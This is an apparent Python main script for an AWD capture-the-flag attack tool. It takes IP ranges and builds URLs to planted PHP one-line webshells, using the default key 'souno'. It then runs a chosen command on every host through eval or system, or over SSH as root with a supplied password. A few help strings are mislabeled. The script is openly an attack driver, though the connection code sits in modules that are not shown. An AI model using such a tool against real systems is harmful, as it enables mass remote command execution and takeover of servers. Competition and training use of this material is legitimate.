import argparse

import rich

from ip_manager import IPManager
from banner import print_banner
from php_connection import PHPConnectionTester
from ssh_connection import SSHConnectionTester

if __name__ == '__main__':
    print_banner()

    parser = argparse.ArgumentParser(description='这是一个用于AWD锦标赛环境中自动攻击的脚本工具。')
    parser.add_argument('-a', '--add', type=str, help='将 IP 范围添加到列表')
    parser.add_argument('-r', '--remove', type=str, help='从列表中删除 IP 范围')
    parser.add_argument('-p', '--port', type=str, default='80', help='用于生成 URL 的端口')
    parser.add_argument('-k', '--key', type=str, default='souno', help='用于生成 URL 的端口')
    parser.add_argument('-u', '--path', type=str, help='URL 生成的路径')
    parser.add_argument('-m', '--method', type=str, default='GET', choices=['GET', 'POST'],
                        help='要使用的 HTTP 方法（GET 或 POST）。')
    parser.add_argument('-s', '--use_system', action='store_true', help='使用 system 函数而不是 eval。')
    parser.add_argument('-c', '--command', type=str, help='需要执行的命令。')
    parser.add_argument('--ssh_port', type=int, default=22, help='SSH 用户名')
    parser.add_argument('--ssh_username', type=str, default='root', help='SSH 用户名')
    parser.add_argument('--ssh_password', type=str, help='SSH 密码')
    args = parser.parse_args()

    # 检查是否有参数被输入
    if not any(vars(args).values()):
        parser.print_help()
        exit(1)

    manager = IPManager()

    if args.add:
        manager.add(args.add)
    if args.remove:
        manager.remove(args.remove)
    if not args.command:
        print('[-]必须使用 -c 指定需要执行的命令。')
        exit(1)
    if args.path:
        manager.generate_urls(args.port, args.path)
        manager.save_urls_to_file()
        if args.command:
            php_con = PHPConnectionTester()
            php_con.test_all_urls(key=args.key, command=args.command, method=args.method, use_system=args.use_system)
        else:
            rich.print("[*]未指定web服务执行命令，跳过php一句话连接")
    else:
        rich.print("[*]未指定web服务一句话路径，跳过路径生成")

    if args.ssh_password:
        ssh_con = SSHConnectionTester()
        ssh_con.test_all_ips(
            port=int(args.ssh_port), command=args.command, username=args.ssh_username, password=args.ssh_password
        )
    else:
        rich.print("[*]未指定SSH连接密码，跳过SSH连接测试")
